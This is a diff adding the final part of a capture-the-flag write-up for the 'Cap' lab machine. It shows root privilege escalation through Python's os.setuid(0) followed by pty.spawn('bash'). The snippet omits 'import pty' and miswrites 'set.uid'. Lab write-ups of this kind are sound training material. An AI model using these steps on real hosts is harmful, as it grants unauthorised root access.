@@ -83,3 +83,24 @@ nathan@cap:~$ ./linpeas.sh
 
 And that's the vulnerability, which means that with Python's help we can change Nathan's ID to Root's ID.
 
+```
+nathan@cap:~$ python3
+>>> import os
+>>> os.setuid(0)
+```
+using `set.uid(0)`, we change our userid.
+
+```
+>>> pty.spawn("bash")
+```
+Now, using `pty`, we get access to bash as a root.
+
+![image](https://github.com/user-attachments/assets/a432e117-9ff0-4541-ade3-06d74da0cefc)
+
+And now we are a root!
+
+![image](https://github.com/user-attachments/assets/37bba4fa-8f56-4b30-8c2a-20d6643fce4c)
+
+And here is the root flag.
+
+The Cap is a fairly simple machine, but nevertheless interesting and ideal for beginners. But that's all, thanks for reading and good luck with hacking :)
